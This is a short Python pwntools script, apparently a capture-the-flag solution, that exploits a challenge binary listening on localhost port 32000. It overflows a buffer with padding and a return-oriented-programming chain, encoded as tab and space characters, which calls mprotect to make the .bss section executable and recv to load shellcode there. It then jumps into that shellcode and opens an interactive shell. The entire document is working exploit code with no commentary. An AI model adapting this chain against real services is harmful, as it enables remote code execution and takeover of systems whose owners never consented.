#!/usr/bin/env python
from pwn import *
context('i386', 'linux', 'ipv4')

sock = remote('localhost', 32000, timeout = None)

shellcode = asm(shellcodes.dupsh(0))

rop = ROP('./chal')

code = rop['.bss'] + 0x10

rop.call('mprotect', (code, len(shellcode), 7))
rop.call('recv', (0, code, len(shellcode), 0))
rop.call(code)

sock.send('black'.ljust(16, '\n'))
data = 'A' * 512 + p32(32)*4 + rop
data = bits_str(data, endian = 'big', one='\t', zero=' ')
data = data.ljust(512 * 10, ' ')
pause()
sock.send(data)

sock.send(shellcode)
sock.interactive()
